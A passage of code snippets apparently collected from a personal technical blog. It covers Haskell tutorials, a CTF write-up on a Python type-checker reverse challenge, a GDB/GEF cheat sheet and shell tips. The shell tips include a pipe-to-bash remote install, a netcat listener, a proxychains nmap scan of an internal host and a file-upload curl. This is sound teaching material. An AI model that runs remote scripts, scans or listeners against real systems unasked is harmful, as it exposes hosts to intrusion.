    print' $ part1 input
  when (runPart2 opts) $ do
    putStr "part2: "
    print' $ part2 input
```

```haskell {data-lang-off}
class ParseLike p where
  -- Parser object, filename, contents -> result.
  doParse :: p a -> String -> String -> a

instance ParseLike ((->) String) where
  doParse f _ = f  -- Apply a parse function `f` on `contents`.

instance ParseLike Parser where
  doParse p file txt = case runParser p file txt of
    Right res -> res
    Left  err -> T.trace (errorBundlePretty err) undefined
```

```haskell {data-lang-off}
main :: IO ()
main = defaultMain defaultFile parse part1 part2

defaultFile :: String
defaultFile = "../input/d01.txt"

parse :: String -> [Int]
parse = map read . lines

part1 :: [Int] -> Int
part1 xs = length $ filter (uncurry (<)) $ zip xs (tail xs)

part2 :: [Int] -> Int
part2 xs =
  part1 $ map (\(a, b, c) -> a + b + c) $ zip3 xs (tail xs) (tail $ tail xs)
```

```haskell {data-lang-off}
criterionMain
  :: (ParseLike p)
  => String   -- Default input file, if no -f option was provided from args.
  -> p a      -- Any instance of ParseLike, e.g. a function (String -> a) or a parser combinator (Parser a).
  -> (a -> [C.Benchmark]) -- Criterion IO () benchmarking function.
  -> IO ()
criterionMain defaultFile parse getBench = do
  (opts, rest)  <- parseArgs (nullOpts { file = defaultFile }) <$> getArgs
  input <- doParse parse (file opts) <$> readFile (file opts)
  withArgs rest $ C.defaultMain $ getBench input
```

```haskell {data-lang-off}
main :: IO ()
main = criterionMain defaultFile parser $ \input ->
  [ C.bgroup "part1" [C.bench "part1" $ C.whnf part1 input]
  , C.bgroup
    "part2"
    [ C.bench "sum of unions" $ C.whnf part2 input
    , C.bench "sum of unions (optimised)" $ C.whnf part2_optimised input
    , C.bench "sum of intersections" $ C.whnf part2_intersect input
    ]
  ]

parser :: Parser [Command]
parser = ...

part1 :: [Command] -> Int
part1 cmds = ...

part2 :: [Command] -> Int
part2 cmds = ...

part2_optimised :: [Command] -> Int
part2_optimised cmds = ...

part2_intersect :: [Command] -> Int
part2_intersect cmds = ...
```

```haskell
-- Haskell Tuple
-- -------------
-- Haskell separates types from data.
tuple1 :: (Bool, Bool) -- Type
tuple1 = (True, False) -- Data

-- Here's another tuple:
tuple2 :: (Int, String)
tuple2 = (42, "Hello world!")

-- We can have a product type of product types.
tuple3 :: ((Int, Double), (Bool, Char))
tuple3 = ((1, 3.14), (True, 'a'))

-- Although semantically, it's the same as...
tuple4 :: (Int, Double, Bool, Char)
tuple4 = (1, 3.14, True, 'a')

-- Haskell Data Constructor
-- ------------------------
-- We define a new type: RectangleType.
-- We also define Rect to be a data constructor.
-- The data constructor takes 4 integer arguments.
data RectangleType = Rect Int Int Int Int

-- We can create a RectangleType by passing concrete 
-- values to the Rect data constructor.
rect :: RectangleType
rect = Rect 0 0 10 5

-- Haskell Record
-- --------------
-- Let's define a record!
-- With Haskell record syntax, we can give names to fields.
-- Here, `Person` is both the type and data constructor.
data Person = Person { name :: String, age :: Int }

-- Let's construct a Person type! A person has a name AND an age.
record :: Person
record = Person { name="Peter Parker", age=16 }
```

```cpp
enum Bool {
	False,
	True,
};
```

```haskell
data Bool = False | True
```

```cpp
// C++ Object-Oriented Approach
using Course = std::string; // For simplicity, a course is simply a string.

class Member {};

class Student : public Member {
public:
    // A student...
    int year;                    // ...belongs to a year.
    std::vector<Course> courses; // ...takes some courses.
};

class Teacher : public Member {
public:
	std::vector<Course> teaches; // A teacher teaches some courses.
};
```

```haskell
type Course = String

data Member = Student { year :: Int, courses :: [Course] }
			| Teacher { teaches :: [Course] }
```

```haskell
data Maybe a = Nothing | Just a
```

```haskell
ghci> divMod x y = (x `div` y, x `mod` y)
ghci> divMod 5 2
(2,1)
ghci> divMod 42 2
(21,0)
```

```haskell
data Maybe a = Nothing | Just a
```

```haskell
ghci> safeDiv x y = if x == 0 then Nothing else Just (x `div` y)
ghci> safeDiv 4 2
Just 2
ghci> safeDiv 7 2
Just 3
ghci> safeDiv 7 0
Nothing
```

```haskell
data Either a b = Left a | Right b
```

```haskell
toRHS :: Either a a -> (Bool, a)
toRHS (Left x) = (True, x)
toRHS (Right x) = (False, x)

toLHS :: (Bool, a) -> Either a a
toLHS (True, x) = Left x
toLHS (False, x) = Right x
```

```haskell
toRHS :: Either Void a -> a
toRHS (Right x) = x
-- toRHS (Left x) = undefined -- Implicit.

toLHS :: a -> Either Void a
toLHS x = Right x
```

```haskell
toRHS :: ((), a) -> a
toRHS ((), x) = x

toLHS :: a -> ((), a)
toLHS x = ((), x)
```

```haskell
data Bool = False () | True ()
```

```scala
// Example of using implicit.
def func(x: Int)(implicit s: String) =
  println(s"string: $s;  int: $x")

// Helper function to run a bunch of SQL statements and return the dataframe results.
def runBatch(sqls: Seq[String])(implicit spark: SparkSession): Dataframe =
  sqls map spark.sql

def main = {
  implicit val str: String = "abc" // Mark variable with the implicit keyword.
  // implicit val str2: String = "def" // Conflict! Two possible implicits of the same type. Error will occur.

  // Notice str is passed implicitly!
  func(1)  // string: abc;  int: 1
  func(42) // string: abc;  int: 42
  func(1)(str) // Same as above.
  func(42)(str)

  // Create a SparkSession object and mark it as implicit.
  implicit val spark: SparkSession = SparkSession.builder.master("local").getOrCreate
  val dfs = runBatch(Seq(
    "SELECT 1",
    "SELECT 2",
  )) // `spark` passed implicitly.
}
```

```haskell
{-# LANGUAGE ImplicitParams #-} -- Enable the implicit parameters language extension.

import Data.Function (on)

-- Declare a generic sort function which takes a comparator.
sortBy :: (a -> a -> Ordering) -> [a] -> [a]
sortBy _ [] = []
sortBy cmp (p:xs) = -- Quickly hacked quick sort.
    sortBy cmp (filter ((== GT) . cmp p) xs) 
    ++ [p] 
    ++ sortBy cmp (filter ((/= GT) . cmp p) xs) 

-- Declare a sort function to sort a list.
sort :: (?cmp :: a -> a -> Ordering) => [a] -> [a]
sort = sortBy ?cmp

main :: IO ()
main = do
    let xs = [(1, 42), (5, 8), (10, 4), (3, 14), (15, 92)]
    let ?cmp = compare `on` fst -- Haskell idiom for constructing comparators.
    
    -- All equivalent: [(1,42),(3,14),(5,8),(10,4),(15,92)]
    print $ sortBy (compare `on` fst) xs    -- Explicit.
    print $ sortBy ?cmp xs                  -- Explicit.
    print $ sort xs                         -- Implicit.
    
    -- Change comparator. [(15,92),(1,42),(3,14),(5,8),(10,4)]
    let ?cmp = compare `on` (negate . snd)
    print $ sortBy ?cmp xs                  -- Explicit.
    print $ sort xs                         -- Implicit.
    
    let ?cmp2 = compare `on` snd
    print $ sortBy ?cmp2 xs
    print $ sort xs -- Which one is implicitly passed? `cmp` or `cmp2`? :)
    
    return ()
```

```haskell
sort :: (?cmp :: a -> a -> Ordering) => [a] -> [a]
```

```cpp
#include <algorithm>
#include <iostream>
#include <vector>

using namespace std; // Bad practice, but just to keep things readable.

// Generic sort with comparator.
template <typename F, typename T>
T sortBy(F cmp, T xs) {
    sort(xs.begin(), xs.end(), cmp);
    return xs;
};

// Sort with implicit comparator. We name it with an underscore to avoid confusion with std::sort.
// Note how `xs` is substituted with the parameter, but `cmp` is "implicitly" used.
#define sort_(xs) sortBy(cmp, xs)

// Helper function.
void print(const vector<pair<int, int>>& xs) {
    for (const auto& [a, b] : xs)
        cout << " (" << a << ", " << b << ")";
    cout << "\n";
};

int main() {
    auto xs = vector<pair<int, int>>{ {1, 42}, {5, 8}, {10, 4}, {3, 14}, {15, 92} };
    
    { //  (1, 42) (3, 14) (5, 8) (10, 4) (15, 92)
        auto cmp = [](auto pa, auto pb) { return pa.first < pb.first; };
        print(sortBy(cmp, xs));
        print(sort_(xs)); // Expanded to `print(sortBy(cmp, xs));`.
    }
     
    { //  (15, 92) (1, 42) (3, 14) (5, 8) (10, 4)
        auto cmp = [](auto pa, auto pb) { return pa.second > pb.second; };
        print(sort_(xs)); // Same expansion happens here.
    }
}
```

```shell
mypy output.py
```

```python
L_<INPUT[i]>[N[ L_<INPUT[i-1]>[N[ ... ]] ]]
```

```python
# Line 378.
class QL_s29(Generic[T], L_n["N[QLW_s31[L_x[N[MR[N[T]]]]]]"]): ...
#          │               │          │
#          │               │          └── Next number
#          │               └── Next letter in flag
#          └── Current number
```

```python
import re

# Extract the lines containing pointers(?)/relationships between letters.
with open('output.py') as f:
    lines = f.readlines()[319:458:2] # Skip every 2 lines, bc redundant info.

lookup = {}

# Parse and store the relationships in a lookup map.
for line in lines:
    curr_idx, char, next_idx = re.findall(r'Q._s(\d+)[^ ]+, L_(\w).*.W_s(\d+)', line)[0]
    lookup[int(curr_idx)] = (int(next_idx), char)

# Follow the pointers until we hit 71.
idx = 29
flag = ''
while idx != 71:
    idx, c = lookup[idx]
    flag += c

# Profit!
{% raw %}print(f'maple{{{flag}}}'){% endraw %}
```

```txt {data-lang-off}
maple{no_type_system_is_safe_from_pl_grads_with_too_much_time_on_their_hands}
```

```python
# Declare a new class called Challenge.
class Challenge:
    # __init__ is a magic method called automatically when an instance is created.
    def __init__(self, title, description):
        print(f"Creating challenge {title}...")
        self.title = title
        self.description = description

# Create instance of our class.
chal = Challenge("Mostly Harmless", "A totally harmless reverse challenge abusing Python types.")
# Prints "Creating challenge Mostly Harmless..."
```

```python
# This also declares a class called Challenge.
class Challenge: ...
```

```python
class Reverse(Challenge): ...
```

```python
assert isinstance(Reverse(), Reverse) == True    # A Reverse is a Reverse. (Duh.)
assert isinstance(Reverse(), Challenge) == True  # A Reverse is also a Challenge.
assert isinstance(Challenge(), Reverse) == False # Supertype is not a subtype.
```

```python
# Create a class for Python Reverse challenges.
class PythonReverse(Python, Reverse): ...
```

```python
class Challenge: ...
class Reverse(Challenge): ...
class Web(Challenge): ...

x: Challenge = Challenge()
y: Challenge = Reverse()
z: Challenge = Web()
```

```python
class Reverse(Challenge): ...
```

```python
class Challenge:
    title = ...
    description = ...
    def print(): ...

class Web:      # No inheritance.
    title = ...
    description = ...
    url = ...
    def print(): ...
    def instantiate(): ...
```

```python
x: int = 5                  # Is type(5) a subtype of int? ✓
y: float = "abc"            # Is type("abc") a subtype of float? ✗
z: Challenge = Reverse()    # Is type(Reverse()) a subtype of Challenge? ✓
```

```python
from typing import *

class Challenge: ...
class Reverse(Challenge): ...
class Web(Challenge): ...
class Pwn(Challenge): ...

# Create a list of different challenges.
chals: List[Challenge] = [Reverse(), Web(), Pwn()]
```

```python
# Create a generic list type using an invariant type variable T.
T = TypeVar('T')
class MyList(Generic[T]): ...

def display(chals: MyList[Challenge]): ...

display(MyList[Reverse]())
# ERROR! Argument 1 to "display" has incompatible type "MyList[Reverse]"; expected "MyList[Challenge]"
```

```python
T = TypeVar('T', covariant=True)
```

```python
class C(Generic[T], A["C[T]"], B["A[T]"]): ...
_: B[C[Z]] = C[C[Z]]
```

```python
from typing import TypeVar, Generic, Any
z = TypeVar("z", contravariant=True)
class N(Generic[z]): ...
x = TypeVar("x")
class C(Generic[x], N[N["C[C[x]]"]]): ...
class T: ...
class U: ...
_: N[C[U]] = C[T]()  # Subtype query: CT <: NCU.
```

```python
a: E[E[Z]] = QRW_s71[L___TAPE_END__[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]()
b: E[E[Z]] = QRW_s46[L___TAPE_END__[N[L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]()
c: E[E[Z]] = QRW_s06[L___TAPE_END__[N[L_s[N[L_d[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]]]()
d: E[E[Z]] = QRW_s30[L___TAPE_END__[N[L_s[N[L_d[N[L_n[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]]]]]()
```

```python
_: E[E[Z]] = QRW_s46[L___TAPE_END__[N[L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]()
```

```python
# Super.
_: E[E[Z]] = E[QRL_s46[N[L___TAPE_END__[N[L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]]]()
# Cancel.
_: QRL_s46[N[L___TAPE_END__[N[L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]] = E[Z]()
```

```python
_: QRL_s46[N[L___TAPE_END__[N[L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]] = QRL_s46[N[QLW_s46[E[E[Z]]]]]()
_: L___TAPE_END__[N[L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]] = QLW_s46[E[E[Z]]]()
_: L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]] = QLW_s46[L___TAPE_END__[N[E[E[Z]]]]]()
_: MR[N[L___TAPE_END__[N[E[E[Z]]]]]] = QLW_s46[L_s[N[L___TAPE_END__[N[E[E[Z]]]]]]]()
_: L___TAPE_END__[N[E[E[Z]]]] = QLW_s46[MR[N[L_s[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]()
_: E[E[Z]] = QLW_s46[MR[N[L_s[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]()
```

```python
# Initial query.
_: E[E[Z]] = QRW_s46[L___TAPE_END__[N[L_s[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]]]()
# Midway.
_: E[E[Z]] = QLW_s46[MR[N[L_s[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]()
```

```python
_: QLR_s46[N[MR[N[L_s[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]] = E[Z]()
_: MR[N[L_s[N[L___TAPE_END__[N[E[E[Z]]]]]]]] = QRW_s46[E[E[Z]]]()
_: L_s[N[L___TAPE_END__[N[E[E[Z]]]]]] = QR_s46[E[E[Z]]]()
_: L___TAPE_END__[N[E[E[Z]]]] = QRW_s71[MR[N[L_x[N[E[E[Z]]]]]]]()
_: E[E[Z]] = QRW_s71[L___TAPE_END__[N[MR[N[L_x[N[E[E[Z]]]]]]]]]()
```

```python
# QRW_s71 query (original).
_: E[E[Z]] = QRW_s71[L___TAPE_END__[N[MR[N[L___TAPE_END__[N[E[E[Z]]]]]]]]]()
# QRW_s71 query (deduced from QRW_s46).
_: E[E[Z]] = QRW_s71[L___TAPE_END__[N[MR[N[L_x[N[E[E[Z]]]]]]]]]()
```

```sh {data-lang-off}
# Describes how to use a command.
help
help [command]
help info
help breakpoint
```

```sh
gdb <filename>
```

```sh {data-lang-off}
file <filename>
```

```sh {data-lang-off}
start    # Starts program and breaks at beginning.
run      # Runs program normally.
continue # Continue program where you left off.
kill     # Kill process.
quit     # Leave GDB.
```

```sh {data-lang-off}
shell <cmd>
shell echo Hi
!<cmd>
```

```sh {data-lang-off}
# Step Debugging
## Step (into).
step
s
## Step over.
next
n
## Step (into) one instruction exactly.
stepi
si
## Step over one instruction.
nexti
ni
## Step out. Execute until (selected) stack frame returns (past end of function).
finish
fin
```

```sh {data-lang-off}
disas <address/function>
disas <start addr>,<end addr>
disas <start addr>,+<offset>

disas main
```

```sh {data-lang-off}
set disassembly-flavor intel
```

```sh {data-lang-off}
x/[n]i <addr>
x/20i 0x5555555dddd0
```

```sh {data-lang-off}
print [expression]

print $rax
p $rax

# Expressions are evaluated.
p $rbx+$rcx*4
```

```sh {data-lang-off}
info registers
info r
registers # (GEF)
reg       # (GEF)
```

```sh {data-lang-off}
set $eax = 0xdeadbeef
```

```sh {data-lang-off}
x/[n][sz][fmt] <addr>

# n: Number of data to print.
# sz: b(byte), h(halfword), w(word), g(giant, 8 bytes)
# fmt: Format to print data.
# - o(octal), x(hex), d(decimal), u(unsigned decimal),
# - z(hex, zero padded on the left)
# - t(binary), f(float), c(char), s(string)
# - a(address), i(instruction),

# 20 words.
x/20wx 0x7fffffffd000

# 20 bytes.
x/20bx 0x7fffffffd000

# View as string.
x/s 0x7fffffffd000
```

```sh {data-lang-off}
set {c-type}<address> = <value>

# For self-compiled sources.
set var i = 10
set {int}0x83040 = 4
```

```sh {data-lang-off}
## C++
set *{uint32_t*}0x7fffffffd000 = 0xdeadbeef
## Rust
set *(0x7fffffffd000 as *const u32) = 0xdeadbeef
```

```sh {data-lang-off}
find <start>, <end>, <data...>
find <start>, +<length>, <data...>

# Find string (including null byte).
find 0x7fffffffd000, 0x7ffffffff000, "Hello world!"

# Find string (excluding null byte).
find 0x7fffffffd000, 0x7ffffffff000, 'H','e','l','l','o'
```

```sh {data-lang-off}
find [/sn] ...
# s: b(byte), h(halfword), w(word), g(giant, 8 bytes)
# n: max number of finds
```

```sh {data-lang-off}
info proc mappings
vmmap # (GEF)
```

```sh {data-lang-off}
# View 100 words (hex) at $rsp.
x/100wx $rsp
```

```sh {data-lang-off}
info frame
```

```sh {data-lang-off}
backtrace
bt
```

```sh {data-lang-off}
heap

# View all chunks.
heap chunks

# View specific chunks.
heap chunk <addr>

# View state of bins (freed chunks).
heap bins
```

```sh {data-lang-off}
break *<address>
break <line-number | label> # For self-compiled programs.
break <stuff...> if <expression>

# Address.
break *0x401234
b *0x401234

# Offset from function.
break *main+200

# Line number and expression.
break main.c:6 if i == 5
```

```sh {data-lang-off}
info breakpoints
info b
```

```sh {data-lang-off}
# Enable/disable all breakpoints.
enable
disable

# Enable/disable specific breakpoints.
enable <breakpoint-id>
disable <breakpoint-id>

# Remove breakpoints.
delete <breakpoint-id>
```

```sh {data-lang-off}
continue <ignore-count>

# Skip 32 breaks.
continue 32
```

```sh {data-lang-off}
# Enable the breakpoint once.
# The breakpoint will be disabled after first hit.
enable once <breakpoint-id>
```

```sh {data-lang-off}
watch <expression>

# Break on write.
watch *0x7fffffffd000

# Break on condition.
## Register
watch $rax == 0xdeadbeef
## Memory
### C/C++
watch *{uint32_t*}0x7fffffffd000 == 0xdeadbeef
### Rust
watch *(0x7fffffffd000 as *const u32) == 0xdeadbeef
```

```sh {data-lang-off}
# Displays table of watchpoints.
info watchpoint
info wat
```

```sh {data-lang-off}
# Check if hardware watchpoints are supported.
show can-use-hw-watchpoints
```

```sh {data-lang-off}
# Read watchpoints: break on read.
rwatch *0x7fffffffd000

# Access watchpoints: break on read or write.
awatch *0x7fffffffd000
```

```sh
gdb --batch --command=test.gdb --args ./test.exe 5
```

```sh {data-language=GDB}
source myscript.gdb
```

```sh
# via the install script
## using curl
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

## using wget
bash -c "$(wget https://gef.blah.cat/sh -O -)"

# or manually
wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
echo source ~/.gdbinit-gef.py >> ~/.gdbinit

# or alternatively from inside gdb directly
gdb -q
(gdb) pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix='-gef.py'); open(g.name, 'wb+').write(u.urlopen('https://tinyurl.com/gef-main').read()); gdb.execute('source %s' % g.name)
```

```python
from pwn import *

bash = process('bash')

# Attach the debugger
gdb.attach(bash, '''
set follow-fork-mode child
break execve
continue
''')

# Interact with the process
bash.sendline(b"echo Hello World")
```

```py
assert '\xc0'.encode() == b'\xc3\x80'
```

```sh {data-lang-off}
# Runs with 'AAAA\x01\x02\x01\x02' as stdin.
r <<<$(perl -e 'print "A"x4 . "\x01\x02"x2;')
```

```sh {data-lang-off}
# (Untested)
c -A < <(perl -e 'print "\x00\x40\x3d\x38"')
```

```sh {data-lang-off}
# Prints 'AAAA\x01\x02\x01\x02' to a temporary file.
shell perl -e 'print "A"x4 . "\x01\x02"x2;' >/tmp/input

# Run the program, use the file as stdin.
r </tmp/input
```

```sh {data-lang-off}
set args
```

```sh {data-lang-off}
set args [arguments...]
```

```python
bash.sendline(b"echo '\x01\x02\x03\x04'")
```

```sh {data-lang-off}
set disable-randomization off
```

```sh {data-lang-off}
pie b <addr>    # PIE breakpoint at offset <addr> in code.
pie run         # Run with pie breakpoints enabled.
```

```sh {data-lang-off}
context
ctx
```

```sh {data-lang-off}
gef config context.enable 0
```

```sh {data-lang-off}
gef config context.enable 1
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
^c # Duh. https://xkcd.com/416/
^d # Exit / EOF.
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
^r
^s
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
[ 1 -eq 1 ] && echo 'true' || echo 'false'
# true
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
reset
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
. ~/.zshrc
source ~/.zshrc
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
tree
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
echo "$((1+1))" "$SHELL"
# 2 /bin/zsh
echo '$((1+1))' '$SHELL'
# $((1+1)) $SHELL
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
echo $'...'
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
echo $'1\n2\n3'
# 1
# 2
# 3
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
echo -n $'can\'t,don\'t,I\'ll,I\'m,won\'t' | awk -vRS=, $'$0 ~ /\'t/'
# can't
# don't
# won't
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
mkdir /var/tmp/lol
# Permission denied.
sudo !!
# → sudo mkdir /var/tmp/lol
# Success!
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
ls long/path
cd !$
# → cd long/path
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
cat long/path/file.txt
mv "!$" "$(dirname !$)/booyah.md"
# → mv long/path/file.txt long/path/booyah.md
```

```sh {data-lang-off}
< out.txt # Read from file (to stdin).
> out.txt # Write to file (from stdout).
>> out.txt # Append to file (from stdout).
2> out.txt # Write to file (from stderr).
&> out.txt # Redirect all output.
&> /dev/null # Redirect everything into the void.
2>&1 # Redirect stderr to stdout.

>& # Same as `&>`.
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
# Cut third field.
awk '$0=$3'
# 
# Print third field. (Pretty much same as the command above.)
awk '{print $3}'
# 
# Use ',' as field delimiter, e.g. for CSVs.
awk -F, '{print $3}'
# 
# Or use the script variable `FS` (Field Separator).
awk -v FS=, '{print $3}
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
seq 1 4 | awk '$1 % 2 == 1'
# 1
# 3
echo $'foo1\nbar1\nfoo2' | awk '$0 ~ /^foo/'
# foo1
# foo2
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
# Add 5 to the first arg, then print the line.
awk '{$1 += 5}1'
# 
seq 1 3 | awk '{$1 += 5}1'
# 6
# 7
# 8
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
awk '{print "booyah",$1,"yahoo"}'
# awk also has variables, if, for, while, arrays, etc.
```

```sh {data-lang-off}
# case-insensitive
-i
# regex
-E
# non-match (inVert)
-v
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
-P <n> # max procs
-n <n> # num args
-I {}  # pattern to insert into command
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
echo $'1\n2\n3'
# 1
# 2
# 3
echo $'1\n2\n3' | xargs 
# 1 2 3
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
cat files.txt | xargs -P 4 -n1 ./do-something-to-file.sh
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
seq 1 1000 | xargs -P 50 -I{} proxychains4 -q nmap -p {} -sT -Pn --open -n -T4 --oN nmap.txt --append-output 192.168.101.10
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
basename ~/.bashrc
# .bashrc
dirname ~/.bashrc
# /home/trebledj
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
pushd # Push current directory, for easier returning.
popd  # Return to directory on top of stack.
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
cd ~/a/b/c
pushd deep/nested/directory
# Jump to `deep/nested/directory`, push `~/a/b/c` into the stack.
cd ../../jump/around/some/more
cd ../../and/a/little/more
popd  # Return to `~/a/b/c`.
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
less file.txt
# 
# Renders ANSI colors.
less -R file.txt
# 
# Pager search becomes case insensitive.
less -I file.txt
# 
# Line numbers.
less -N file.txt
```

```sh {data-lang-off}
j # Line down.
k # Line up.
f # Page down.
b # Page up.
d # Half-page down.
u # Half-page up.

g # Go to start of file.
G # Go to end of file.

<n> g # Go to nth line.

# Go to the n% line of the file.
<n> p
20p 40p 50p 80p

# What's the current line?
^g
```

```sh {data-lang-off}
# Search (regex enabled).
/ <pattern>
# For case-insensitive search, use `less -I`.

# Navigate search results: next/prev result.
nN

# Filter lines by search.
& <pattern>
# Filter NON-MATCHING lines
& ! <pattern>
# Clear filter.
& <enter>
```

```sh {data-lang-off}
# Continuous feed (e.g. for streams of data)
F
```

```sh {data-lang-off}
# Next file.
:n
# Previous file.
:p
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
^z # Push process to background (and pause it).
bg # Start background process.
fg # Bring most recent background process into foreground.
fg 2 # Bring job 2 into foreground.
jobs # View background jobs.
# 
^c # Good ol' ctrl-c stops the process in fg.
kill <pid> # Kill process with given process ID.
# 
# Start a command in the background.
<cmd> &
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
python -m http.server 8080 &
# [1] 17999
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
fg
^c
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
kill 17999
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
ps aux
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
ifconfig
ifconfig tun0
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
curl ifconfig.me
# X.X.X.X
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
netstat -anp
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
# Initiate a connection.
nc 192.168.1.1 8080
# 
# Listen for a connection.
nc -nlvp 4444
# 
# Listen persistently (keep listening after disconnect).
nc -nklvp 4444
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
# Download and save to a local file.
curl <url> -O
wget <url>
# 
# Download with a custom filename.
curl <url> -o filename.txt
wget <url> -O filename.txt
# 
# Download silently and display in `less`.
curl <url> -s | less
wget <url> -s | less
curl some.api.site/api/v1/users/ -s | jq | less
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# " data-label=Server}
python -m uploadserver
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# " data-label=Client}
curl -F files=@file1.txt -F files=@file2.txt 192.168.45.179:8000/upload
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
# Make new branch.
git checkout -b <name>
# 
# Checkout commits in tree before HEAD.
git checkout HEAD~1  # 1 commit before.
git checkout HEAD~10 # 10 commits before.
# 
# Checkout commit from parent.
git checkout HEAD^  # 1 commit before (from parent 1, base).
git checkout HEAD^2 # 1 commit before (from parent 2, target).
# 
# Store changes locally.
git stash
git stash pop
# 
# Clean edited files.
git reset [--hard]
# --hard removes unstaged files.
# 
# View changes.
git diff | less
git diff <file> # See change in specific file.
# 
# Jump through commits (to find, say, the cause of a bug).
git bisect [start|reset|good|bad|skip]
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
# Command-line git tree from git log.
git log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)' --all
# 
# More detailed git-tree 
git log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(bold yellow)%d%C(reset)%n''          %C(white)%s%C(reset) %C(dim white)- %an%C(reset)' --all
# 
# Add them as git aliases in ~/.gitconfig or script aliases in ~/.bashrc.
# See https://stackoverflow.com/a/9074343/10239789.
```

```sh {data-lang-off}
:wq  # Write to file + exit.
:q!  # Force exit.
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
echo -n '\x01\x02'
# 
echo -n '\x41' | xxd
# 00000000: 41                     A
```

```sh {data-lang-off .command-line data-prompt="$" data-filter-output="# "}
perl -e 'print "\x41"x4 . "\x42\x43"' | xxd
# 00000000: 4141 4141 4243         AAAABC
```

```python
assert '\xc0'.encode() == b'\xc3\x80'
```

```html {data-lang-off}
<i class="fas fa-rocket"></i>
```

```css
.fas {
  font-family: "Font Awesome 6 Free"
  font-style: normal;
  font-weight: 900;
}

@font-face {
    font-family: "Font Awesome 6 Free";
    font-style: normal;
    font-weight: 900;
    font-display: block;
    src: url(../webfonts/fa-solid-900.woff2) format("woff2"), url(../webfonts/fa-solid-900.ttf) format("truetype")
}
```

```css
.fa-rocket:before {
  content: "\f135"
}
```

```cpp
// --- Dynamic ---

size_t size = 10;
int* array1 = new int[size];
// `size` is dynamic. e.g. can change with input.
// Note that we can also resize the array and reassign the pointer.

// Use the array...
for (int i = 0; i < size; i++)
    array1[i] = i;

delete[] array1;


// --- Static ---

// Define a maximum capacity...
#define MAX_SIZE 100                // ...with a macro,
// constexpr size_t MAX_SIZE = 100; // ...or use C++'s type-safe constexpr.

int array2[MAX_SIZE];

// Use the array... (be careful to use `size` instead of `MAX_SIZE`).
for (int i = 0; i < size; i++)
    array2[i] = i;
```

```cpp
// STL
// Allocate a dynamic vector (on the heap). Capacity grows on-demand.
std::vector<int> vec1 = {1,2,3};

// ETL
// Allocate a static vector (on the stack) with fixed capacity.
etl::vector<int, 10> vec2 = {1,2,3};
```

```csp {data-label=Example.csp}
<!DOCTYPE html>
<html>
<body>
<%c++ if (true) { %>
    <h1>Hi [[ name ]]</h1>
<%c++ } else { %>
    <h1>Bye [[ name ]]</h1>
<%c++ } %>
</body>
</html>
```

```cpp {data-label=main.cpp}
app().registerHandler(
